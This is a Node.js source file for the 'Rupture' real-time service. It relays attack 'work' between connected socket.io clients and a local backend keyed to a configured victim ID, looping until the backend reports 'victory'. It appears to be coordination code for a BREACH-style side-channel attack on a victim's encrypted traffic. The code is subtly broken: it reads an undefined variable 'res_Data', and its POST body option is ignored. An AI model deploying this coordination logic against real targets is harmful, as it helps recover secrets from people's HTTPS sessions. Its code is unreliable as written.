const io = require('socket.io'),
      winston = require('winston'),
      http = require('http'),
      config = require('./config.js');

winston.remove(winston.transports.Console);
winston.add(winston.transports.Console, {'timestamp': true});

const PORT = 3031;

winston.info('Rupture real-time service starting');
winston.info('Listening on port ' + PORT);

var socket = io.listen(PORT);

const BACKEND_HOST = 'localhost',
      BACKEND_PORT = '8000';

socket.on('connection', function(client) {
    winston.info('New connection from client ' + client.id);

    var createNewWork = function() {
        var getWorkOptions = {
            host: BACKEND_HOST,
            port: BACKEND_PORT,
            path: '/breach/get_work/' + config.victim_id
        };

        http.request(getWorkOptions, function(response) {
            var res_data = '';
            response.on('data', function(chunk) {
                res_data += chunk;
            });
            response.on('end', function() {
                winston.info('Got (get-work) response from backend: ' + res_data);
                client.emit('do-work', JSON.parse(res_data));
            });
        }).end();
    }

    client.on('get-work', function() {
        winston.info('get-work from client ' + client.id);
        createNewWork();
    });

    client.on('work-completed', function({work, success, host}) {
        winston.info('Client indicates work completed: ', work, success, host);

        var requestBody = work;
        requestBody['success'] = success;

        var workCompletedOptions = {
            host: BACKEND_HOST,
            port: BACKEND_PORT,
            path: '/breach/work_completed/' + config.victim_id,
            method: 'POST',
            json: requestBody
        };

        http.request(workCompletedOptions, function(response) {
            var res_data = '';
            response.on('data', function(chunk) {
                res_data += chunk;
            });
            response.on('end', function() {
                winston.info('Got (work-completed) response from backend: ' + res_data);
                var victory = JSON.parse(res_Data)['victory'];
                if (victory === false) {
                    createNewWork();
                }
            });
        }).end();
    });
    client.on('disconnect', function() {
        winston.info('Client ' + client.id + ' disconnected');
    });
});
